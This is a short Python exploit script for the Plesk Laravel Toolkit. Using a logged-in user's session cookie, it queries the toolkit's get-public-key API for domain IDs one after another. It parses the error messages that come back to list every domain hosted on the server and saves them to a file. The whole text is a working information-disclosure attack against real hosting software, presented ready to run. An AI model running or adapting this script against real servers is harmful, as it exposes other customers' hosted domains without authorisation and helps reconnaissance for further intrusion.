import requests
import sys
import json
import re

# Plesk Laravel Toolkit - Disclosure of All Domains on the Server

if len(sys.argv) < 5:
    print("\n" + " usage: python "+sys.argv[0]+" test.com 500 YOUR_AUTH_COOKIE output.txt")
    print('\n [!] Paste the "PLESKSESSID_INSECURE" cookie value of the logged in user into YOUR_AUTH_COOKIE.')
    print('\n [!] Write how many domains you want to be tried / listed instead of "500"')
    exit()


target_domain = sys.argv[1]
list_count = sys.argv[2]
plesk_auth = sys.argv[3]
out_file = sys.argv[4]

cookies = {
    'PLESKSESSID_INSECURE':plesk_auth
}

def domain_parser(text):
    return re.findall("'(.*?)'",text)[0]

def save_log(domain):
    output_file = open(out_file,"a")
    output_file.write(domain)
    output_file.close()
    

headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Referer': 'http://'+target_domain+':8443/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}
for x in range(1,int(list_count)):
    r = requests.get("http://"+str(target_domain)+":8443/modules/laravel/index.php/api/get-public-key?domain="+str(x),cookies=cookies,verify=False,headers=headers)    
    response = json.loads(r.text)
    
    if "Can not find" in response["msg"]:
        print("[#] " + str(x) + " ID Domain Not Found.")
    elif "for the domain" in response["msg"]:
        json_response = response["msg"]
        founded_domain = domain_parser(json_response)
        
        print("[#] " + str(x) + " ID Domain Founded!! => " + founded_domain)
        save_log(founded_domain)
        
        
print("\n \n ### FINISH ### ")
